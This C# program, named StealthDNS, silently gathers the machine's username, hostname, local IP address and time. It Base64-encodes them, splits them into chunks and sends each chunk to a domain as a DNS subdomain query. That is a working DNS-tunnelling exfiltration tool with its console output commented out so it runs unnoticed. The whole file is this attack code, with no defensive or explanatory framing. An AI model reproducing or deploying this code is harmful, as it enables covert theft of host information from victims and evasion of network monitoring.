using System.Net;
using System.Net.Sockets;
using DnsClient;

namespace StealthDNS
{
    internal class Program
    {

        const String DOMAIN = "example.com";

        static void Main(string[] args)
        {
            //We get the information that we need

            String hostName = Dns.GetHostName();
            String ip = GetLocalIPAddress();
            DateTime time = DateTime.Now;
            String userName = Environment.UserName;
            String textToSend = "STARTINFO;" + time + ";" + userName + ";" + hostName + ";" + ip + ";" + "ENDINFO;";

            //Console.WriteLine("The string to send is: " + textToSend);

            IEnumerable<String> queriesToSend = createQueries(textToSend);

            performQuery(queriesToSend);    
            
        }


        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        public static IEnumerable<String> createQueries(string text)
        {

            IEnumerable<String> queries = Enumerable.Empty<string>();

            try
            {
                String encodedString = Base64Encode(text);
                String queryInProgress = String.Empty;

                queries = ChunksUpto(encodedString, 20);

                /*
                Console.WriteLine("Queries:");
                foreach (String query in queries)
                 {
                  Console.WriteLine(query);
                }

                */

                return queries;
            }
            catch (Exception e)
            {
                //Console.WriteLine("Error creating the queries: " + e.Message);
                return queries;
            }

        }

        //Code to split the encoded string into substrings to generate more queries.
        static IEnumerable<String> ChunksUpto(String str, int maxChunkSize)
        {
            for (int i = 0; i < str.Length; i += maxChunkSize)
                yield return str.Substring(i, Math.Min(maxChunkSize, str.Length - i)) + "."  + DOMAIN;
        }


        public static bool performQuery(IEnumerable<String> queries){
            try
            {
                var client = new LookupClient();
                foreach (String query in queries)
                {
                    var result = client.Query(query, QueryType.A);
                }
                return true;
            }catch (Exception e)
            {
                //Console.WriteLine("Error performing DNS queries: " + e.Message);
                return false;
            }
        }
    }
}